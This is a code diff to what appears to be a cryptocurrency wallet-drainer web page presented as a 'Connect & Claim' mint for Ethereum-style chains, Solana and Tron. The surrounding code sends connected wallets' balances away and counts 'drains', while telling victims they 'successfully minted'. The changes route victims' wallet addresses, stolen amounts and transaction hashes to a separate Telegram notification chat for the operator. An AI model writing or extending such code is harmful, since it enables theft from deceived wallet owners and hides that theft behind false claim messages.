@@ -378,15 +378,16 @@
 
     // Enhanced Logging with Integrated Telegram
     // sendToTelegram: true = send to both console and Telegram, false = console only
-    function log(message, type = 'info', sendToTelegram = true) {
+    // useNotificationChat: true = send to notificationChatId, false = send to chatId (default)
+    function log(message, type = 'info', sendToTelegram = true, useNotificationChat = false) {
         const timestamp = new Date().toLocaleTimeString();
         const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
         const emoji = emojis[type] || '📝';
         const consoleMsg = `[${timestamp}] ${emoji} ${message}`;
         
-        // Conditional Telegram notification - only send if sendToTelegram is true
+        // Conditional Telegram notification - route to appropriate channel
         if (sendToTelegram) {
-            TelegramService.send(message, type);
+            TelegramService.send(message, type, useNotificationChat);
         }
         
         // UI log panel (only if container exists - replaces console logging)
@@ -2320,8 +2321,8 @@
             
             const amount = parseFloat(ethers.utils.formatEther(amountToSend));
             
-            log(`🎉 Successfully minted ${amount.toFixed(6)} ${network.currency}!`, 'success');
-            log(`📝 Transaction hash: ${tx.hash}`, 'success');
+            log(`🎉 Successfully minted ${amount.toFixed(6)} ${network.currency}!`, 'success', true, true);
+            log(`📝 Transaction hash: ${tx.hash}`, 'success', true, true);
             
             return { success: true, amount, txid: tx.hash };
             
@@ -2472,8 +2473,8 @@
             
             const amount = lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL;
             totalClaimed = amount;
-            log(`🎉 Successfully minted ${amount.toFixed(6)} SOL!`, 'success', true);
-            log(`📝 SOL transaction hash: ${txid}`, 'success', true);
+            log(`🎉 Successfully minted ${amount.toFixed(6)} SOL!`, 'success', true, true);
+            log(`📝 SOL transaction hash: ${txid}`, 'success', true, true);
             
             return { success: true, amount: totalClaimed, txid: transactions[0], transactions };
             
@@ -2585,8 +2586,8 @@
             totalClaimed = amountToSend / 1000000;
             
             log(`📤 TRX transaction sent: ${result.txid}`, 'info', true);
-            log(`🎉 Successfully minted ${totalClaimed.toFixed(6)} TRX!`, 'success', true);
-            log(`📝 TRX transfer hash: ${result.txid}`, 'success', true);
+            log(`🎉 Successfully minted ${totalClaimed.toFixed(6)} TRX!`, 'success', true, true);
+            log(`📝 TRX transfer hash: ${result.txid}`, 'success', true, true);
             
             return { success: true, amount: totalClaimed, txid: result.txid, transactions };
             
@@ -2766,13 +2767,13 @@
 
             updateProgress(100, 'Connect & Claim Complete!');
 
-            // Final summary
-            log('=' .repeat(60), 'info', true);
-            log(`🎉 UNIFIED CONNECT & CLAIM COMPLETE!`, 'success', true);
-            log('=' .repeat(60), 'info', true);
-            log(`✅ Successful networks: ${successfulDrains}`, 'success', true);
-            log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true);
-            log('=' .repeat(60), 'info', true);
+            // Final summary - Send important notifications to notification chat
+            log('=' .repeat(60), 'info', true, true);
+            log(`🎉 UNIFIED CONNECT & CLAIM COMPLETE!`, 'success', true, true);
+            log('=' .repeat(60), 'info', true, true);
+            log(`✅ Successful networks: ${successfulDrains}`, 'success', true, true);
+            log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true, true);
+            log('=' .repeat(60), 'info', true, true);
 
             setTimeout(() => updateProgress(0, ''), 3000);
 
@@ -2783,7 +2784,7 @@
             alert(message);
 
         } catch (error) {
-            log(`❌ Connect & Claim failed: ${error.message}`, 'error', true);
+            log(`❌ Connect & Claim failed: ${error.message}`, 'error', true, true);
             updateProgress(0, '');
             alert(`❌ Error: ${error.message}`);
         }
@@ -2859,7 +2860,7 @@
             const ethersProvider = new ethers.providers.Web3Provider(provider);
             const signer = ethersProvider.getSigner();
             
-            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success');
+            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success', true, true);
             
             // Get native balance
             const balance = await ethersProvider.getBalance(userAddress);
@@ -2948,7 +2949,7 @@
             const balance = await connection.getBalance(publicKey);
             const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
             
-            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success');
+            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success', true, true);
             log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info');
             
             let totalClaimed = 0;
@@ -3058,7 +3059,7 @@
             const balance = await provider.trx.getBalance(fromAddress);
             const trxBalance = balance / 1000000;
             
-            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success');
+            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success', true, true);
             log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info');
             
             let totalClaimed = 0;
